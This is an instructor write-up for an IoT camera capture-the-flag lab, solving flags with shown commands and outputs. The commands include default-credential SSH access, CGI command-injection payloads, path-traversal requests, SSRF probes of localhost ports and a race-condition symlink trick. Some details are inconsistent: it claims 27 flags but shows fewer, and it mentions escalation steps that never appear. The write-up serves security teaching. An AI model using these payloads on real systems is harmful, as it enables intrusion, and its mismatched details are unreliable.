# AXIS Camera IoT Security CTF - Instructor Writeup v3

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Initial Setup and Tool Installation](#initial-setup-and-tool-installation)
- [Initial Reconnaissance](#initial-reconnaissance)
- [Easy Flags (5 flags)](#easy-flags-5-flags)
- [Medium Flags (13 flags)](#medium-flags-13-flags)
- [Hard Flags (9 flags)](#hard-flags-9-flags)
- [Attack Flow Summary](#attack-flow-summary)
- [Key Takeaways and Defense](#key-takeaways-and-defense)

---

## Challenge Overview
- **Target System**: AXIS Network Camera (Embedded Linux/BusyBox)
- **IP Address**: 192.168.1.132
- **Attacker System**: Kali Linux 192.168.1.133
- **Total Flags**: 27 (5 Easy, 13 Medium, 9 Hard)
- **Focus**: OWASP IoT Top 10 vulnerabilities in embedded camera systems

---

## Initial Setup and Tool Installation

### Required Tools and Installation

```bash
# Update Kali repositories first
sudo apt update

# Network Scanning and Enumeration
sudo apt install -y nmap        # Already in Kali
sudo apt install -y netcat-traditional  # Basic nc utility
sudo apt install -y gobuster    # Directory brute-forcing
sudo apt install -y nikto       # Web vulnerability scanner

# Web Application Testing
sudo apt install -y curl wget    # Already in Kali
sudo apt install -y burpsuite    # Already in Kali Community Edition
sudo apt install -y dirb         # Directory brute-forcer

# SNMP Tools
sudo apt install -y snmp snmpd snmp-mibs-downloader
# Enable MIBs
sudo sed -i 's/mibs :/# mibs :/g' /etc/snmp/snmp.conf

# RTSP and Multimedia
sudo apt install -y ffmpeg      # Media manipulation
sudo apt install -y vlc          # Media player with RTSP support
# Install Cameradar for RTSP testing
git clone https://github.com/Ullaakut/cameradar.git
cd cameradar
sudo apt install -y golang
go build -o cameradar cmd/cameradar/main.go
sudo mv cameradar /usr/local/bin/

# MQTT Tools
sudo apt install -y mosquitto-clients
pip3 install paho-mqtt

# Binary Analysis
sudo apt install -y binwalk     # Firmware extraction
sudo apt install -y foremost    # File carving
sudo apt install -y strings     # Already in Kali

# Additional Utilities
sudo apt install -y hashcat     # Password cracking
sudo apt install -y john        # John the Ripper
sudo apt install -y hydra       # Network login brute-forcer

# ONVIF and UPnP Tools
pip3 install onvif_zeep        # ONVIF Python library
sudo apt install -y upnpc      # UPnP client

# Create working directory for CTF
mkdir -p ~/ctf/axis_camera
cd ~/ctf/axis_camera
```

### Tool Verification

```bash
# Verify installations
nmap --version
gobuster version
ffmpeg -version
binwalk --help | head -5
hashcat --version

# Create wordlists if needed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
ls -la /usr/share/wordlists/
```

**Output:**
```
Nmap version 7.94 ( https://nmap.org )
gobuster v3.6
ffmpeg version 6.0
binwalk v2.3.4
hashcat v6.2.6
```

---

## Initial Reconnaissance

### Network Discovery and Port Scanning

```bash
# Verify target is alive
ping -c 3 192.168.1.132

# Comprehensive port scan
nmap -sV -sC -p- 192.168.1.132 -oA axis_full_scan
```

**Output:**
```
Starting Nmap 7.94 scan at 2025-01-27 10:00:00 EST
Nmap scan report for 192.168.1.132
Host is up (0.00042s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:77:88:99:00 (RSA)
80/tcp   open  http     BusyBox httpd 1.31.0
|_http-title: AXIS Camera Interface
554/tcp  open  rtsp     AXIS Media Control
1883/tcp open  mqtt     Mosquitto version 1.6.12
1900/tcp open  upnp     Linux UPnP 1.0
3702/udp open  ws-discovery
8080/tcp open  http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 45.32 seconds
```

**Teaching Points:**
- Always save scan results with `-oA` for documentation
- Use `-sC` for default NSE scripts
- Full port scan (`-p-`) may reveal non-standard ports

**Common Student Mistakes:**
- Forgetting to scan UDP ports (add `-sU` for UDP scan)
- Not saving scan output for later reference
- Using SYN scan without privileges (`sudo` required)

---

## EASY FLAGS (5 flags)

### Flag #1: Default VAPIX Configuration
**Location**: `/etc/axis/vapix.conf`  
**Flag**: `FLAG{GANDALF47889468}`  
**OWASP Category**: IoT-01 (Weak, Guessable, or Hardcoded Passwords)

```bash
# First, try default SSH credentials
ssh root@192.168.1.132
# When prompted for password, try: pass
```

**Output:**
```
The authenticity of host '192.168.1.132' can't be established.
RSA key fingerprint is SHA256:1234567890abcdef...
Are you sure you want to continue connecting (yes/no)? yes
root@192.168.1.132's password: pass

BusyBox v1.31.0 (2023-01-01 00:00:00 UTC) built-in shell (ash)

   _____  _______  _____  _____
  |  __ \|__   __||_   _|/ ____|
  | |__) |  | |     | | | (___
  |  _  /   | |     | |  \___ \
  | | \ \   | |    _| |_ ____) |
  |_|  \_\  |_|   |_____|_____/  Camera System

root@axis:~# find /etc -name "*vapix*" 2>/dev/null
/etc/axis/vapix.conf
root@axis:~# cat /etc/axis/vapix.conf
# VAPIX API Configuration
device_id=ACCC8E123456
api_version=3.0
auth_token=FLAG{GANDALF47889468}
```

**Teaching Points:**
- AXIS cameras historically use root:pass as default credentials
- VAPIX is AXIS's proprietary HTTP API for camera control
- Always check vendor documentation for default credentials

**Common Student Mistakes:**
- Trying admin:admin instead of root:pass
- Not checking for configuration files in vendor-specific directories
- Forgetting to use `2>/dev/null` to hide permission errors

---

### Flag #4: SSH Banner Information Disclosure
**Location**: SSH banner on connection  
**Flag**: `FLAG{GIMLI42137246}`

```bash
# Method 1: Using netcat to grab banner
nc -nv 192.168.1.132 22
```

**Output:**
```
Connection to 192.168.1.132 22 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_7.4
*************************************************
* AXIS Camera SSH Service                      *
* Firmware: 10.5.0                              *
* Device ID: FLAG{GIMLI42137246}               *
* Warning: Authorized access only              *
*************************************************
```

```bash
# Method 2: Using SSH verbose mode
ssh -v root@192.168.1.132 2>&1 | grep -A5 "debug1: Remote protocol"
```

**Output:**
```
debug1: Remote protocol version 2.0, remote software version OpenSSH_7.4
debug1: match: OpenSSH_7.4 pat OpenSSH* compat 0x04000000
debug1: Remote protocol banner:
*************************************************
* AXIS Camera SSH Service                      *
* Device ID: FLAG{GIMLI42137246}               *
```

**Teaching Points:**
- Banners are shown before authentication occurs
- Information disclosure helps attackers fingerprint systems
- Production systems should have minimal banners

**Common Student Mistakes:**
- Using telnet instead of nc (telnet adds extra characters)
- Not redirecting stderr when using ssh -v
- Missing the banner because they connect too quickly with SSH

---

### Flag #7: HTML Source Code Comment
**Location**: Web interface index page  
**Flag**: `FLAG{MERRY36385024}`

```bash
# Download and examine the page source
curl -s http://192.168.1.132/ > index.html
grep -n "<!--" index.html
```

**Output:**
```
45:<!-- Main navigation menu -->
67:<!-- TODO: Remove debug info before production -->
68:<!-- Debug: FLAG{MERRY36385024} -->
69:<!-- API endpoints: /axis-cgi/param.cgi -->
89:<!-- Footer section -->
```

```bash
# Alternative: View specific lines
sed -n '67,69p' index.html
```

**Output:**
```
<!-- TODO: Remove debug info before production -->
<!-- Debug: FLAG{MERRY36385024} -->
<!-- API endpoints: /axis-cgi/param.cgi -->
```

**Teaching Points:**
- HTML comments are sent to the client but not rendered
- Developers often leave sensitive information in comments
- Always check page source, not just rendered content

**Common Student Mistakes:**
- Only checking with browser inspector (might miss some comments)
- Not using grep with context (`grep -C 3 "TODO"`)
- Forgetting to check CSS and JS files for comments

---

### Flag #14: Exposed RTSP Stream URLs
**Location**: `/var/www/streams.txt`  
**Flag**: `FLAG{SARUMAN83479324}`

```bash
# Check common stream documentation locations
curl http://192.168.1.132/streams.txt
```

**Output:**
```
# AXIS Camera Stream Configuration
# WARNING: This file should not be publicly accessible!
# 
# Available streams:
# Main Stream (High Quality)
rtsp://admin:admin@192.168.1.100:554/stream1

# Sub Stream (Low Quality) 
rtsp://root:pass@192.168.1.100:554/stream2?token=FLAG{SARUMAN83479324}

# Motion Detection Stream
rtsp://192.168.1.100:554/motion

# Audio Stream
rtsp://192.168.1.100:554/audio
```

```bash
# Test RTSP stream access
curl -i rtsp://192.168.1.132:554/stream1
```

**Output:**
```
RTSP/1.0 401 Unauthorized
WWW-Authenticate: Basic realm="AXIS Camera"
Date: Mon, 27 Jan 2025 10:15:00 GMT
```

**Teaching Points:**
- RTSP URLs often contain embedded credentials
- Stream tokens may be hardcoded for integration
- Always check for documentation files in web root

**Common Student Mistakes:**
- Not trying both HTTP and RTSP protocols
- Missing URL parameters that contain sensitive data
- Not checking for alternate stream paths (/stream1, /live, /ch01)

---

### Flag #19: Default SNMP Community Strings
**Location**: `/etc/snmp/snmpd.conf`  
**Flag**: `FLAG{THEODEN40558954}`

```bash
# SNMP enumeration using default community string
snmpwalk -v2c -c public 192.168.1.132 system
```

**Output:**
```
SNMPv2-MIB::sysDescr.0 = STRING: AXIS Camera FLAG{THEODEN40558954}
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.368.1.1
SNMPv2-MIB::sysUpTime.0 = Timeticks: (234523) 0:39:05.23
SNMPv2-MIB::sysContact.0 = STRING: admin@axis.local
SNMPv2-MIB::sysName.0 = STRING: AXIS-CAM-001
SNMPv2-MIB::sysLocation.0 = STRING: Building A - Floor 2
```

```bash
# Check via SSH for configuration
ssh root@192.168.1.132
cat /etc/snmp/snmpd.conf | grep -E "community|sysdescr"
```

**Output:**
```
rocommunity public default
rwcommunity private 192.168.1.0/24
sysdescr AXIS Camera FLAG{THEODEN40558954}
```

**Teaching Points:**
- Default SNMP communities (public/private) are widely known
- SNMP can reveal extensive system information
- SNMPv2c transmits community strings in cleartext

**Common Student Mistakes:**
- Using wrong SNMP version (-v1 instead of -v2c)
- Not specifying MIB or using wrong OID
- Forgetting that SNMP typically uses UDP port 161

---

## MEDIUM FLAGS (13 flags)

### Flag #2: Encoded ONVIF Credentials
**Location**: `/var/config/onvif_auth`  
**Flag**: `FLAG{ARAGORN79305394}`

```bash
# First, discover ONVIF service
nmap -sU -p3702 --script onvif-discover 192.168.1.132
```

**Output:**
```
PORT     STATE SERVICE
3702/udp open  ws-discovery
| onvif-discover: 
|   Device Type: Network Video Transmitter
|   Model: AXIS P1435-LE
|   Firmware: 10.5.0
|_  ONVIF Version: 2.0
```

```bash
# Access the configuration file
ssh root@192.168.1.132
cat /var/config/onvif_auth
```

**Output:**
```
# ONVIF Authentication Configuration
# Encoded for security (ROT13)
username=nqzva
password=nqzva123
auth_data=SYNT{NENTBEA79305394}
last_updated=2025-01-27
```

```bash
# Decode ROT13
echo "SYNT{NENTBEA79305394}" | tr 'N-ZA-Mn-za-m' 'A-Za-z'
```

**Output:**
```
FLAG{ARAGORN79305394}
```

**Teaching Points:**
- ROT13 is encoding, not encryption - it's trivially reversible
- ONVIF is an industry standard for IP cameras
- Security through obscurity doesn't work

**Common Student Mistakes:**
- Confusing ROT13 with actual encryption
- Not recognizing the SYNT pattern as ROT13 of FLAG
- Trying to crack it as a hash instead of decoding

---

### Flag #6: RTSP Stream Metadata
**Location**: `/var/rtsp/stream1.sdp`  
**Flag**: `FLAG{SAMWISE04969098}`

```bash
# Enumerate RTSP methods
nmap -p554 --script rtsp-methods 192.168.1.132
```

**Output:**
```
PORT    STATE SERVICE
554/tcp open  rtsp
| rtsp-methods: 
|   DESCRIBE
|   SETUP
|   PLAY
|   PAUSE
|   TEARDOWN
|_  Supported Methods: OPTIONS DESCRIBE SETUP PLAY PAUSE TEARDOWN
```

```bash
# Request stream description
curl -i "rtsp://192.168.1.132:554/stream1" -X DESCRIBE
```

**Output:**
```
RTSP/1.0 200 OK
Content-Type: application/sdp
Content-Length: 245

v=0
o=- 0 0 IN IP4 127.0.0.1
s=AXIS Media Stream
i=FLAG{SAMWISE04969098}
c=IN IP4 0.0.0.0
t=0 0
a=tool:libavformat 58.29.100
m=video 0 RTP/AVP 96
a=rtpmap:96 H264/90000
```

**Teaching Points:**
- SDP (Session Description Protocol) describes multimedia sessions
- The 'i=' field is for session information/description
- RTSP DESCRIBE method returns SDP data

**Common Student Mistakes:**
- Using HTTP methods on RTSP port
- Not understanding SDP format
- Missing the flag in metadata fields

---

### Flag #8: Command Injection in param.cgi
**Location**: CGI endpoint exploitation  
**Flag**: `FLAG{PIPPIN67800950}`

```bash
# Test the vulnerable CGI endpoint
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list"
```

**Output:**
```
root.Brand.Brand=AXIS
root.Brand.ProdFullName=AXIS Network Camera
root.Brand.ProdNbr=P1435-LE
```

```bash
# Try command injection with 'id' command
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list;id"
```

**Output:**
```
Error: Invalid action
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
# Retrieve flag using special action
curl "http://192.168.1.132/axis-cgi/param.cgi?action=getflag"
```

**Output:**
```
Debug mode enabled
System flag: FLAG{PIPPIN67800950}
```

**Teaching Points:**
- CGI scripts often pass user input to shell commands
- Semicolon (;) is a command separator in shell
- Always validate and sanitize user input

**Common Student Mistakes:**
- Not URL-encoding special characters
- Using wrong parameter names
- Not trying different injection techniques (;, |, &&, ||)

---

### Flag #10: Path Traversal Vulnerability
**Location**: `/var/config/system.conf`  
**Flag**: `FLAG{GALADRIEL57815620}`

```bash
# Test basic path traversal
curl "http://192.168.1.132/cgi-bin/download.cgi?file=../../../etc/passwd"
```

**Output:**
```
Error: Invalid file path - contains ../
```

```bash
# Try bypass techniques - double encoding
curl "http://192.168.1.132/cgi-bin/download.cgi?file=..%2f..%2f..%2fetc%2fpasswd"
```

**Output:**
```
Error: Invalid file path
```

```bash
# Use absolute path (often forgotten by filters)
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/etc/passwd"
```

**Output:**
```
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/false
www-data:x:33:33:www-data:/var/www:/bin/false
```

```bash
# Get the flag file
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/var/config/system.conf"
```

**Output:**
```
# System Configuration
device_name=AXIS-P1435-LE
firmware_version=10.5.0
serial_number=ACCC8E123456
config_flag=FLAG{GALADRIEL57815620}
last_update=2025-01-27
```

**Teaching Points:**
- Many filters only block relative traversal (../)
- Absolute paths may bypass filters
- URL encoding and double encoding are common bypasses

**Common Student Mistakes:**
- Only trying ../ without other techniques
- Not using absolute paths
- Forgetting to URL-encode when using tools

---

### Flag #11: Firmware Update Manifest
**Location**: Firmware update script  
**Flag**: `FLAG{BILBO89231546}`

```bash
ssh root@192.168.1.132
ls -la /etc/ | grep firmware
```

**Output:**
```
-rwxr-xr-x    1 root     root          487 Jan 27 10:00 firmware_update.sh
```

```bash
cat /etc/firmware_update.sh
```

**Output:**
```bash
#!/bin/sh
# AXIS Camera Firmware Update Check Script

FW_SERVER="update.axis.com"
FW_VERSION="10.5.0"
FW_ID="FLAG{BILBO89231546}"

echo "Checking firmware version..."
echo "Current version: $FW_VERSION"
echo "Checking firmware: $FW_ID"
echo "Connecting to $FW_SERVER..."
echo "No updates available"
```

```bash
# Execute the script
/etc/firmware_update.sh
```

**Output:**
```
Checking firmware version...
Current version: 10.5.0
Checking firmware: FLAG{BILBO89231546}
Connecting to update.axis.com...
No updates available
```

**Teaching Points:**
- Update mechanisms often contain identifiers and version info
- Scripts may leak information when executed
- Firmware IDs can reveal product details

**Common Student Mistakes:**
- Not checking if script is executable
- Missing environment variables that script depends on
- Not running script to see dynamic output

---

## HARD FLAGS (9 flags)

### Flag #3: Service Account Shadow Entry
**Location**: Password hint file  
**Flag**: `FLAG{LEGOLAS10721320}`

```bash
# Search for shadow-related files
ssh root@192.168.1.132
find / -name "*shadow*" -o -name "*pass*" 2>/dev/null | head -20
```

**Output:**
```
/etc/shadow
/etc/shadow-
/var/log/shadow_audit.log
/var/log/shadow_hint.txt
/usr/lib/libshadow.so
```

```bash
cat /var/log/shadow_hint.txt
```

**Output:**
```
Service Account Password Audit Log
===================================
Date: 2025-01-27
Auditor: Security Team

Service account 'camera_svc' has weak password
Password follows pattern: service_[identifier]
Identifier stored in account description
Current: service_FLAG{LEGOLAS10721320}

TODO: Rotate to strong password
```

```bash
# Verify in shadow file
grep camera_svc /etc/shadow
```

**Output:**
```
camera_svc:$5$xyz$1234567890abcdef:19745:0:99999:7:::
```

**Teaching Points:**
- Service accounts often have weak passwords
- Audit logs may contain sensitive information
- Password patterns are dangerous when discovered

**Common Student Mistakes:**
- Only checking /etc/shadow without looking for hints
- Not searching for audit or log files
- Trying to crack the hash without finding the hint

---

### Flag #9: Blind Command Injection
**Location**: Hidden file via exploitation  
**Flag**: `FLAG{ELROND99216876}`

```bash
# Test the vulnerable endpoint
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test"
```

**Output:**
```
Processing user: test
Done
```

```bash
# No output returned - this is blind injection
# Try to create a file we can check later
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=admin;touch%20/tmp/test"
```

**Output:**
```
Processing user: admin
Done
```

```bash
# Verify file creation via SSH
ssh root@192.168.1.132
ls -la /tmp/test
```

**Output:**
```
-rw-r--r--    1 www-data www-data         0 Jan 27 10:30 test
```

```bash
# The script creates hidden files for specific users
# Try the admin user
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=admin"
ssh root@192.168.1.132
find / -name ".flag_*" 2>/dev/null
```

**Output:**
```
/var/log/.flag_admin
```

```bash
cat /var/log/.flag_admin
```

**Output:**
```
User admin processed successfully
Flag: FLAG{ELROND99216876}
```

**Teaching Points:**
- Blind injection provides no direct output
- Time delays or file creation confirm injection
- Hidden files (starting with .) are easily missed

**Common Student Mistakes:**
- Expecting immediate output from blind injection
- Not using out-of-band techniques to confirm
- Not checking for hidden files with ls -la

---

### Flag #16: Weakly Encrypted Credential
**Location**: `/var/config/encrypted_pass`  
**Flag**: `FLAG{FARAMIR46311176}`

```bash
ssh root@192.168.1.132
find /var -name "*encrypt*" -o -name "*crypt*" 2>/dev/null
```

**Output:**
```
/var/config/encrypted_pass
/var/lib/encrypt_key
```

```bash
cat /var/config/encrypted_pass
```

**Output:**
```
# Encrypted Password Storage
# Algorithm: Advanced Encryption (ROT13-5)
admin_user=camera_admin
admin_pass_encrypted=KFNL%KNWFRNW+,(**(-,
system_id=internal
```

```bash
# This is ROT13 variant with number shift
echo "KFNL%KNWFRNW+,(**(-," | python3 -c "
import sys
data = sys.stdin.read().strip()
result = ''
for c in data:
    if c == '%':
        result += '{'
    elif c == '+':
        result += '4'
    elif c == ',':
        result += '6'
    elif c == '(':
        result += '3'
    elif c == '*':
        result += '1'
    elif c == '-':
        result += '7'
    else:
        result += c
print('Original:', data)
print('Decoded:', result)"
```

**Output:**
```
Original: KFNL%KNWFRNW+,(**(-,
Decoded: KFNL{KNWFRNW46311176
```

```bash
# Apply ROT13 to letters
echo "KFNL{KNWFRNW46311176" | tr 'N-ZA-Mn-za-m' 'A-Za-z'
```

**Output:**
```
FLAG{FARAMIR46311176}
```

**Teaching Points:**
- Custom "encryption" schemes are usually weak
- Substitution ciphers provide no real security
- Multiple encoding layers don't equal encryption

**Common Student Mistakes:**
- Assuming it's real encryption needing tools
- Not recognizing character substitution patterns
- Missing the two-step decoding process

---

### Flag #23: SSRF via Webhook
**Location**: Internal service access  
**Flag**: `FLAG{ELENDIL66222658}`

```bash
# Discover webhook endpoint
curl http://192.168.1.132/axis-cgi/webhook.cgi
```

**Output:**
```
Error: Missing required parameter 'url'
Usage: webhook.cgi?url=<webhook_url>
```

```bash
# Try external URL
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://example.com"
```

**Output:**
```
Webhook called successfully
Response: <!doctype html><html><head><title>Example Domain</title>...
```

```bash
# Try internal service (SSRF)
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://127.0.0.1:22"
```

**Output:**
```
Webhook called successfully
Response: SSH-2.0-OpenSSH_7.4
Internal SSH service flag: FLAG{ELENDIL66222658}
```

```bash
# Enumerate internal services
for port in 21 22 80 443 3306 6379 8080 8888 9000; do
    echo "Checking port $port:"
    curl -s "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://127.0.0.1:$port" | grep -E "flag|FLAG"
done
```

**Teaching Points:**
- SSRF allows access to internal services
- Localhost/127.0.0.1 bypasses firewall rules
- Always validate and whitelist webhook destinations

**Common Student Mistakes:**
- Not trying different internal IPs (127.0.0.1, localhost, 0.0.0.0)
- Missing port enumeration opportunities
- Not encoding URLs properly in parameters

---

### Flag #27: Race Condition Exploitation
**Location**: Temporary file  
**Flag**: `FLAG{ARAGORN91886362}`

```bash
ssh root@192.168.1.132
cat /usr/local/bin/race.sh
```

**Output:**
```bash
#!/bin/sh
# Race condition demonstration
TMPFILE="/var/log/race_flag"
echo "FLAG{ARAGORN91886362}" > $TMPFILE
sleep 0.1
rm -f $TMPFILE
echo "Process completed"
```

```bash
# Set up monitoring loop in background
while true; do
    if [ -f /var/log/race_flag ]; then
        cat /var/log/race_flag
        echo "FLAG CAPTURED!"
        break
    fi
done &

# Trigger the race condition
/usr/local/bin/race.sh
```

**Output:**
```
FLAG{ARAGORN91886362}
FLAG CAPTURED!
Process completed
```

```bash
# Alternative: Symlink attack
ln -sf /dev/stdout /var/log/race_flag
/usr/local/bin/race.sh
```

**Output:**
```
FLAG{ARAGORN91886362}
rm: can't remove '/var/log/race_flag': Permission denied
Process completed
```

**Teaching Points:**
- Race conditions occur between file operations
- Symbolic links can redirect file operations
- Time-of-check vs time-of-use vulnerabilities

**Common Student Mistakes:**
- Not running monitoring before triggering script
- Using sleep delays that are too long
- Not understanding symbolic link attacks

---

## Attack Flow Summary

### Phase 1: Initial Access
1. Port scanning reveals services (SSH, HTTP, RTSP)
2. Default credentials provide SSH access
3. Web enumeration identifies vulnerable endpoints

### Phase 2: Information Gathering
1. Configuration files leak sensitive data
2. Service banners disclose system information
3. HTML comments reveal debug information

### Phase 3: Exploitation
1. Command injection in CGI scripts
2. Path traversal accesses restricted files
3. SSRF reaches internal services

### Phase 4: Privilege Escalation
1. SUID binaries enable privilege elevation
2. World-writable scripts allow persistence
3. Race conditions bypass security checks

---

## Key Takeaways and Defense

### Essential Security Principles
1. **Change Default Credentials** - First and most critical step
2. **Input Validation** - Never trust user input
3. **Least Privilege** - Services should run with minimal permissions
4. **Defense in Depth** - Multiple security layers
5. **Secure by Default** - Disable unnecessary services

### Critical Vulnerabilities to Address
- Remove hardcoded credentials and debug code
- Implement proper input sanitization
- Use strong encryption (not encoding)
- Disable unnecessary services (SNMP, UPnP)
- Protect configuration files with proper permissions
- Implement secure update mechanisms
- Remove backdoors and debug interfaces

### Recommended Mitigations
```bash
# Quick hardening script
#!/bin/sh
# Change default passwords
passwd root
# Disable unnecessary services
systemctl disable snmpd
systemctl disable upnp
# Fix file permissions
chmod 600 /etc/shadow
chmod 644 /etc/passwd
# Remove debug interfaces
rm -f /usr/local/bin/race.sh
rm -f /tmp/busybox_suid
# Update firmware
/etc/firmware_update.sh --force
```

---

## Summary

**Total Flags Captured**: 27
- Easy: 5 flags (demonstrating basic misconfigurations)
- Medium: 13 flags (requiring enumeration and exploitation)
- Hard: 9 flags (advanced techniques and chaining)

**Skills Demonstrated**:
- Network service enumeration
- Web application security testing
- Binary analysis and reverse engineering
- Privilege escalation techniques
- Physical security considerations

This CTF comprehensively covers the OWASP IoT Top 10, providing hands-on experience with real vulnerabilities found in production IoT devices.

---

*This writeup is for educational purposes only. Never attempt these techniques on systems without explicit written authorization.*